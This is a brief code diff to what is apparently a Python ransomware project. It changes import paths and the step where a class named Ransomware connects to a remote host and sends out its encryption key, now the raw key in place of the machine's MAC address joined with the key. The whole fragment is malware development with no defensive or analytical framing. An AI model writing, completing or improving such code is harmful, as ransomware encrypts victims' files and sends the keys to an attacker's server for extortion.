@@ -1,8 +1,8 @@
 # Import modules
 from __init__ import *
 from time import sleep
-from modules.system import System
-from modules.encdec import Fernet, Encrypt, Decrypt
+from lib.system import System
+from lib.encdec import Fernet, Encrypt, Decrypt
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -21,7 +21,7 @@ class Ransomware:
         while not connected and retries < 3:
             try:
                 self.server.connect((self.host, self.port))
-                self.server.sendall(f'{self.system.Mac()}|{self.key.decode("utf-8")}'.encode('utf-8'))
+                self.server.sendall(self.key)
                 connected = True
             except:
                 retries += 1
